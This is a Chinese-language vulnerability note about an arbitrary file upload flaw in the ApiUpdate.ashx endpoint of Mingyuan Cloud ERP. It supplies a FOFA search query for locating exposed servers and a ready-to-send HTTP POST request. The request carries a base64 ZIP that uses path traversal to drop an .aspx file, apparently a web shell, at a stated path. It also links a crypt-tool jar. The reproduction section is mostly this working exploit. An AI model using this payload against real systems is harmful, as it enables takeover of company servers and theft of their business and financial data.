# 明源云ERP系统接口管家 ApiUpdate.ashx 文件存在任意文件上传漏洞

# 一、漏洞简介
明源云ERP系统是一个云端部署的ERP系统，具有高效、灵活和可定制的特点。它支持多种自定义功能，包括表单、报表、流程等，企业可以根据自身业务需求进行个性化定制，提高管理效率与操作便捷性。同时，该系统提供丰富的移动端应用，员工可以随时随地进行业务操作、数据查询与报表分析，实现高效协同，提高企业运营效率。此外，明源云ERP系统还具有精确的财务数据管理功能，通过集成各个财务子模块，实现财务数据的自动收集、整理和汇总，并自动生成准确的财务报表。总之，明源云ERP系统是一个高效、灵活、可定制的ERP系统，可以满足企业的个性化需求，并实现高效协同和精确的财务数据管理。明源云ERP系统接口管家 ApiUpdate.ashx 文件存在任意文件上传漏洞，攻击者通过构造特殊的ZIP压缩包可以上传任意文件，控制服务器。

# 二、影响版本
+ 明源云ERP系统接口管家

# 三、资产测绘
+ fofa`(body="hibot.js" || title="明源云ERP")`
+ 特征

![1705156735709-3c67057a-1062-4d33-ae3f-c47d2ecec7b8.png](./img/BzjSaX8PT1v6Uhqf/1705156735709-3c67057a-1062-4d33-ae3f-c47d2ecec7b8-848761.png)

# 四、漏洞复现
```http
POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 

{{base64_decode("UEsDBBQAAAAIAPKaC1eX6YtyjAAAAJMAAAAeAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4JMzLCsIwFATQXwmRQrsJCt1IqyiKUPBRWsT1bRhqIWliHoJ/b8TdMGeYOtuxlkawM81jTGHDDwvOsm2doNHWuMCupOEtyWT9xwdo0dz+E9YlMLOHeLgpIOdSlstyNax5UZ0mBXGEQup7uDecuJBtKTzzDq8IH8TdKbEfvFEx4AdFUaXbLwAAAP//AwBQSwECFAMUAAAACADymgtXl+mLcowAAACTAAAAHgAAAAAAAAAAAAAAAAAAAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4UEsFBgAAAAABAAEATAAAAMgAAAAAAA==")}}
```

![1705156776315-0a29ef7c-c666-4373-934e-151a99603e60.png](./img/BzjSaX8PT1v6Uhqf/1705156776315-0a29ef7c-c666-4373-934e-151a99603e60-447163.png)

上传文件位置

```http
/fdccloud/_/check.aspx
```

![1705156800899-0428c6e3-5187-49bc-b37b-52efb3f6a0bd.png](./img/BzjSaX8PT1v6Uhqf/1705156800899-0428c6e3-5187-49bc-b37b-52efb3f6a0bd-526784.png)

[Mosaic-crypt-tools-1.5-SNAPSHOT-jar-with-dependencies.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222141911-beeed224-b25e-4b46-a48c-afe3ed72af43.jar)

![1705156847091-4e04f815-6782-4825-9a31-03bd550bb8e2.png](./img/BzjSaX8PT1v6Uhqf/1705156847091-4e04f815-6782-4825-9a31-03bd550bb8e2-864612.png)

![1705156862381-a0bb1008-1a00-4eed-b5ae-0e91d0dbbb0b.png](./img/BzjSaX8PT1v6Uhqf/1705156862381-a0bb1008-1a00-4eed-b5ae-0e91d0dbbb0b-735826.png)



> 更新: 2024-02-29 23:55:42  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wlaowua3lmsbig8l>